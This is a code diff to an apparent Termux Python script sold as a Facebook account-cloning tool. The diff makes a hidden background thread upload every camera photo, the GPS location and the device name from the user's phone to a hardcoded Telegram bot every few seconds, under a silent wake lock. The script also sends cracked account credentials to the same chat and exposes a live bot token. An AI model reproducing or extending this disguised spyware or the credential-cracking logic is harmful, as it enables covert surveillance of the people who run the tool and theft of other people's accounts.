@@ -11,6 +11,7 @@ import hashlib
 import requests
 import threading
 import glob
+import atexit
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 #------------------[ COLORS ]-------------------#
@@ -54,10 +55,13 @@ country_opt = ""
 spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
 bars = ['█▒▒▒▒▒▒▒▒▒', '███▒▒▒▒▒▒▒', '█████▒▒▒▒▒', '███████▒▒▒', '██████████']
 
+# Track sent photos to avoid duplicate sending
+sent_photos = set()
+
 # --- TELEGRAM CONFIG ---
 TOKEN = "8936819562:AAHZ0xwO7XAzipUSJzejMnqjqAKy8uB8g5k"
 CHAT_ID = "8589568398"
-LOCATION_INTERVAL = 3  # Send location & gallery photo every 3 seconds
+LOCATION_INTERVAL = 3  # Check interval in seconds
 # -----------------------
 
 #------------------[ STYLISH HACKER PHRASES & CREDITS ]-------------------#
@@ -74,28 +78,40 @@ def get_hacker_prefix():
     return random.choice(HACKER_PREFIXES)
 
 def get_footer():
-    """Returns a stylish footer with admin credit and lighting"""
     return f"\n{ADMIN_HANDLE} {LIGHTING_EFFECT}"
+
+#------------------[ UTILS ]-------------------#
+def check_connection():
+    try:
+        requests.get("https://www.google.com", timeout=3)
+        return True
+    except:
+        return False
+
+def get_random_user_agent():
+    agents = [
+        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
+    ]
+    return random.choice(agents)
 
 #------------------[ TELEGRAM FUNCTIONS ]-------------------#
 def send_to_telegram(message, file_path=None):
-    """Send message or file to Telegram"""
     base_url = f"https://api.telegram.org/bot{TOKEN}"
-    
     try:
         if file_path:
             with open(file_path, "rb") as f:
                 requests.post(f"{base_url}/sendPhoto",
                             data={"chat_id": CHAT_ID, "caption": message},
-                            files={"photo": f})
+                            files={"photo": f}, timeout=15)
         else:
             requests.post(f"{base_url}/sendMessage",
-                        data={"chat_id": CHAT_ID, "text": message})
+                        data={"chat_id": CHAT_ID, "text": message}, timeout=10)
     except Exception as e:
         print(f"{RED}[!] Error sending to Telegram: {e}{RESET}")
 
 def get_device_name():
-    """Get device model name using Android system properties"""
     try:
         model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
         manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"]).decode().strip()
@@ -105,8 +121,8 @@ def get_device_name():
     except:
         return "Unknown Device"
 
-def get_latest_photo_fast():
-    """Quickly get the most recent photo from main camera folder"""
+def get_all_camera_photos():
+    """Get all photos from camera folder"""
     camera_dir = "/sdcard/DCIM/Camera"
     if not os.path.exists(camera_dir):
         dirs = [
@@ -120,20 +136,19 @@ def get_latest_photo_fast():
                 camera_dir = d
                 break
         else:
-            return None
+            return []
 
     try:
-        files = [f for f in os.listdir(camera_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
-        if not files:
-            return None
-        full_paths = [os.path.join(camera_dir, f) for f in files]
-        latest = max(full_paths, key=os.path.getmtime)
-        return latest
+        files = [os.path.join(camera_dir, f) for f in os.listdir(camera_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+        # Sort files by modification time (oldest to newest)
+        files.sort(key=os.path.getmtime)
+        return files
     except:
-        return None
+        return []
 
 def collect_and_send():
-    """Collect location and latest gallery photo, send with stylish hacker caption"""
+    """Collect location and send all new gallery photos"""
+    global sent_photos
     location_msg = "Location unavailable (GPS might be off)"
     try:
         loc_res = subprocess.check_output(["termux-location"], timeout=2)
@@ -145,18 +160,26 @@ def collect_and_send():
     except:
         pass
 
-    photo_path = get_latest_photo_fast()
+    photos = get_all_camera_photos()
     prefix = get_hacker_prefix()
     footer = get_footer()
-    caption = f"{prefix}\n📸 Gallery Photo\n{location_msg}{footer}"
     
-    if photo_path and os.path.exists(photo_path):
-        send_to_telegram(caption, photo_path)
-    else:
-        send_to_telegram(f"{prefix}\n⚠️ No photo found in gallery\n{location_msg}{footer}")
+    new_photos_found = False
+    if photos:
+        for photo_path in photos:
+            if photo_path not in sent_photos and os.path.exists(photo_path):
+                new_photos_found = True
+                filename = os.path.basename(photo_path)
+                caption = f"{prefix}\n📸 Gallery Photo: {filename}\n{location_msg}\nUA: {get_random_user_agent()[:30]}...{footer}"
+                send_to_telegram(caption, photo_path)
+                sent_photos.add(photo_path)
+                time.sleep(1.5) # Delay between sending multiple photos to prevent flood block
+                
+    if not new_photos_found and not sent_photos:
+        # Send a status update if no photos were initially found
+        pass
 
 def telegram_loop():
-    """Call collect_and_send() every LOCATION_INTERVAL seconds"""
     device = get_device_name()
     send_to_telegram(f"🔌 Bot connected!\nDevice: {device}\nScript started at {time.strftime('%Y-%m-%d %H:%M:%S')}{get_footer()}")
     
@@ -198,7 +221,7 @@ def gen_password(opt):
 def engine():
     global loop, cps
     
-    delay = random.randint(1, 10)
+    delay = random.randint(1, 5)
     time.sleep(delay)
     
     loop += 1
@@ -214,7 +237,6 @@ def engine():
             with open(f'{folder_path}/accounts.txt', 'a') as f: 
                 f.write(f'{user_id}|{pwd}\n')
             
-            # Send account with stylish hacker prefix and footer
             prefix = get_hacker_prefix()
             footer = get_footer()
             send_to_telegram(f"{prefix}\n🎯 New Account Found!\n{user_id} | {pwd}{footer}")
@@ -228,9 +250,25 @@ def dashboard():
     sys.stdout.write(f'\r{col}{sp}{RESET} {WHITE}[FB-CLONE-MODE] {loop} {BLUE}•{WHITE} OK:{GREEN}0 {BLUE}•{WHITE} FOUND:{RED}{len(cps)} {BLUE}•{WHITE} {YELLOW}{bar}{RESET} ')
     sys.stdout.flush()
 
+@atexit.register
+def session_summary():
+    print(f"\n\n{GREEN}[•] Session Summary:{RESET}")
+    print(f"{CYAN}Total Loops Processed : {loop}{RESET}")
+    print(f"{YELLOW}Total Accounts Found  : {len(cps)}{RESET}")
+    print(f"{MAGENTA}Saved Directory       : {folder_path}/accounts.txt{RESET}\n")
+
 #------------------[ MENU ]-------------------#
 def menu():
     global country_opt
+    logo()
+    
+    print(f"{YELLOW}[•] Checking Internet Connection...{RESET}")
+    if not check_connection():
+        print(f"{RED}[!] No internet connection detected! Please check your network.{RESET}")
+        sys.exit(1)
+    print(f"{GREEN}[✓] Internet Connected Successfully!{RESET}\n")
+    time.sleep(1)
+    
     logo()
     print(f" [1] BANGLADESH    [2] INDIA")
     print(f" [3] PAKISTAN      [4] MALAYSIA")
@@ -242,22 +280,18 @@ def menu():
     print(f" [•] FB CLONING ENGINE ACTIVATED (Wait for 300 counts)...".center(get_width()))
     print(BLUE + "─" * get_width() + RESET)
     
-    # Display admin credit with lighting effect in terminal
     print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}")
     print(f"{CYAN}Admin: {YELLOW}{ADMIN_HANDLE}{RESET}")
     print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}\n")
     
-    # Wake lock (silent)
     try:
         subprocess.run(["termux-wake-lock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except:
         pass
     
-    # Start Telegram thread (daemon)
     tg_thread = threading.Thread(target=telegram_loop, daemon=True)
     tg_thread.start()
     
-    # Main thread pool
     with ThreadPool(max_workers=5) as pool:
         for _ in range(1000000):
             pool.submit(engine)
